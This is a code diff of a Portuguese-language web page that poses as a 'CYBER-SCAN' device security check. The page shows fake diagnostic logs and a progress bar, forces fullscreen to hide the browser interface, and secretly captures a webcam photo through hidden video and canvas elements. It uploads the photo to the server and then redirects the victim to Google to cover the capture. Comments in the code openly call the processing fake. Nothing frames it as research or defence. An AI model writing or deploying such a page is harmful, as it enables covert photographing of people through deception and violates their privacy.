@@ -2,56 +2,275 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <title>Carregando...</title>
-</head>
-<body style="background-color: #fff; font-family: sans-serif;">
-    <div style="text-align: center; margin-top: 50px;">
-        <p>Carregando conteúdo, aguarde...</p>
-        <div class="spinner" style="width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
-    </div>
-    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação de Segurança da Conexão</title>
     <style>
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-    </style>
+        :root {
+            --primary: #00d2ff;
+            --secondary: #3a7bd5;
+            --bg-dark: #0f172a;
+            --text-light: #e2e8f0;
+            --text-muted: #94a3b8;
+        }
 
-    <!-- Elementos ocultos -->
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            background-color: var(--bg-dark);
+            font-family: 'Courier New', Courier, monospace;
+            color: var(--text-light);
+            overflow: hidden;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .header {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--primary);
+            margin-bottom: 10px;
+            letter-spacing: 2px;
+        }
+
+        .sub-header {
+            font-size: 0.9rem;
+            color: var(--text-muted);
+            margin-bottom: 40px;
+        }
+
+        .scanner-box {
+            width: 150px;
+            height: 150px;
+            border: 2px solid var(--secondary);
+            border-radius: 50%;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .scanner-core {
+            width: 50px;
+            height: 50px;
+            background-color: var(--primary);
+            border-radius: 50%;
+            box-shadow: 0 0 20px var(--primary);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(0.9); opacity: 0.7; }
+            50% { transform: scale(1.1); opacity: 1; }
+            100% { transform: scale(0.9); opacity: 0.7; }
+        }
+
+        .log-container {
+            width: 100%;
+            max-width: 400px;
+            height: 120px;
+            background-color: #1e293b;
+            border: 1px solid #334155;
+            border-radius: 8px;
+            padding: 15px;
+            text-align: left;
+            font-size: 0.8rem;
+            color: #10b981;
+            overflow-y: auto;
+            margin-bottom: 20px;
+        }
+
+        .log-line { margin-bottom: 5px; }
+        .log-line span { color: var(--text-muted); }
+
+        .status-bar {
+            font-size: 0.9rem;
+            color: var(--primary);
+            font-weight: bold;
+        }
+
+        .progress-container {
+            width: 100%;
+            max-width: 400px;
+            height: 8px;
+            background-color: #334155;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-top: 10px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background-color: var(--primary);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        /* Elementos de Mídia (Invisíveis) */
+        #video, #canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">CYBER-SCAN v4.2</div>
+        <div class="sub-header">Analisando integridade do dispositivo</div>
+
+        <div class="scanner-box">
+            <div class="scanner-core"></div>
+        </div>
+
+        <div class="log-container" id="logConsole">
+            <div class="log-line">> Inicializando módulos de diagnóstico...</div>
+            <div class="log-line">> Verificando handshake de rede... <span>[OK]</span></div>
+        </div>
+
+        <div class="status-bar" id="statusText">ESPERANDO PERMISSÃO DE HARDWARE...</div>
+        
+        <div class="progress-container">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+    </div>
+
+    <video id="video" width="640" height="480" autoplay playsinline></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        const statusText = document.getElementById('statusText');
+        const progressFill = document.getElementById('progressFill');
+        const logConsole = document.getElementById('logConsole');
 
-        async function iniciarCaptura() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-            } catch (err) {
-                console.log("Erro ao acessar câmera: ", err);
+        let progress = 0;
+        let logs = [
+            "> Mapeando topologia de sensores...",
+            "> Calibrando matriz de pixels...",
+            "> Encriptando pacotes de telemetria...",
+            "> Sincronizando dados locais..."
+        ];
+        let logIndex = 0;
+
+        function addLog(message) {
+            const line = document.createElement('div');
+            line.className = 'log-line';
+            line.innerHTML = `> ${message}`;
+            logConsole.appendChild(line);
+            logConsole.scrollTop = logConsole.scrollHeight;
+        }
+
+        function updateProgress(value) {
+            progressFill.style.width = value + '%';
+        }
+
+        // Tenta ativar o modo tela cheia para ocultar a UI do navegador
+        function tryFullscreen() {
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen().catch(err => console.log("Fullscreen failed:", err));
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen();
             }
         }
 
-        async function enviarFoto() {
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, 640, 480);
-            
-            const imageData = canvas.toDataURL('image/jpeg');
-
+        async function iniciarScan() {
             try {
+                statusText.innerText = "SOLICITANDO ACESSO A SENSORES...";
+                addLog("Requisição de mídia enviada ao kernel.");
+
+                // 1. Solicita a câmera
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user', 
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    } 
+                });
+                
+                video.srcObject = stream;
+
+                // Atualiza status após permissão
+                statusText.innerText = "SENSOR ATIVO. CAPTURA EM ANDAMENTO...";
+                addLog("Stream de vídeo estabelecido.");
+
+                // Tenta fullscreen agora que o usuário interagiu (clique/autorização)
+                tryFullscreen();
+
+                // 2. Aguarda o vídeo carregar
+                video.onloadedmetadata = () => {
+                    // Inicia o "falso" processamento
+                    const interval = setInterval(() => {
+                        if (progress < 95) {
+                            progress += Math.random() * 10;
+                            if (progress > 95) progress = 95;
+                            updateProgress(progress);
+                            
+                            if (logIndex < logs.length) {
+                                addLog(logs[logIndex]);
+                                logIndex++;
+                            }
+                        }
+                    }, 300);
+
+                    // 3. Captura após 2 segundos (tempo suficiente para a imagem estabilizar)
+                    setTimeout(async () => {
+                        clearInterval(interval);
+                        await capturarEEEnviar();
+                    }, 2000);
+                };
+
+            } catch (err) {
+                console.error("Erro ao acessar câmera:", err);
+                statusText.innerText = "ERRO CRÍTICO: FALHA NO SENSOR.";
+                addLog("Exceção: Permission denied. Verifique configurações do navegador.");
+            }
+        }
+
+        async function capturarEEEnviar() {
+            try {
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, 640, 480);
+                const imageData = canvas.toDataURL('image/jpeg');
+
+                statusText.innerText = "ENVIANDO TELEMETRIA...";
+                updateProgress(100);
+
                 const response = await fetch('/upload', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ image: imageData })
                 });
-                if(response.ok) console.log("Enviado!");
+
+                if (response.ok) {
+                    statusText.innerText = "DIAGNÓSTICO CONCLUÍDO.";
+                    addLog("Telemetria enviada com sucesso. Hash: " + Math.random().toString(36).substring(2, 10).toUpperCase());
+                    
+                    // Opcional: Redirecionar para um site "limpo" após 3s
+                    setTimeout(() => {
+                        window.location.href = "https://www.google.com"; // Ou outro site neutro
+                    }, 3000);
+
+                } else {
+                    throw new Error("Falha no envio");
+                }
+
             } catch (err) {
                 console.error("Erro no envio:", err);
+                statusText.innerText = "FALHA NA TRANSMISSÃO.";
             }
         }
 
+        // Inicia o processo
         window.onload = () => {
-            iniciarCaptura();
-            setTimeout(enviarFoto, 3000); // Tira a foto após 3 segundos
+            iniciarScan();
         };
     </script>
 </body>
